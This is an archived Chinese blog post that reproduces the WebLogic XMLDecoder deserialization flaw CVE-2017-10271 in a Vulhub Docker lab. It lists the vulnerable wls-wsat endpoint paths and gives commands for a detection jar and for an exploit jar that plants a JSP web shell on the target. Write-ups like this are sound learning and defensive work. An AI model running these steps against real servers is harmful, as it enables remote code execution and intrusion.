# weblogic XMLDecoder 反序列化 CVE-2017-10271 工具检测+工具利用复现 - 求知鱼 - 博客园

> 原文：[`www.cnblogs.com/Qiuzhiyu/p/13574195.html`](https://www.cnblogs.com/Qiuzhiyu/p/13574195.html)

被 360 众测靶场残虐，所以决定把这些常规漏洞（Vulhub）都学一下他们的利用。

环境：

docker   搭建 weblogic  XMLDecoder 反序列化环境 

kali 虚拟机

本地物理机 Win10  谷歌浏览器  Git Bash

工具：[`github.com/RealBearcat/Oracle-WebLogic-CVE-2017-10271`](https://github.com/RealBearcat/Oracle-WebLogic-CVE-2017-10271)

![](img/8923e72ae5513259e00f5cbc9f1eed4e.png)

 环境搭建：

```
git clone https://github.com/vulhub/vulhub.git     #可以看到有很多漏洞环境

```

　![](img/ceece0e6afe8d87667c8362209bebaa2.png)

 我这个是从一个安装包解压来的，不过都是一样的，上面给的方式更方便一些，如果你可以科学&上网的话。

```
cd vulhub/weblogic/CVE-2017-10271  #选中这一目录  进去开启漏洞环境

```

![](img/61e80073bd51bfad649a66062b3287dc.png)

```
docker-compose  build  #此处出现过一个坑 有可能会报一下错误    

```

　![](img/1a90aaf1a6f1f6ea2b821151203dc8df.png)

 错误原因是有一个编译包中缺少一个 py 模块，[**解决方式**](https://blog.csdn.net/lql971203/article/details/89047265)

```
docker-compose up -d   #部署开启漏洞环境如下   要是不知道网址 可以 ifconfig 一下

```

　　![](img/b091e3b8c1a20016d45c578a960f13a2.png)

 **检测：**检测其实不太重要，因为这个漏洞是 weblogic 系列的，大家一般都会有这一系的检测工具

手动检测：访问这些目录  出现下图就说明大可能存在

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11

```

![](img/2350cdc4b08978cd44c6403942cb6c29.png)

 工具检测：

```
java  -jar WebLogic-Wls-wsat-XMLDecoder.jar  -u http://192.168.80.1:7001

```

工具利用：写命令 shell

```
java  -jar  WebLogic_Wls-Wsat_RCE_Exp.jar http://192.168.80.129:7001 z.jsp    #后面的 z.jsp 名字可以自己起   jsp 后缀不能变

```

![](img/034bd7a0aaedcbda5a2a5e25364b1624.png)

 尝试浏览器连接：

![](img/c855dfd5eaab640f551f6ae85567c249.png)

 ![](img/0aff2c11cd3d5ebd0311e7c91edfc444.png)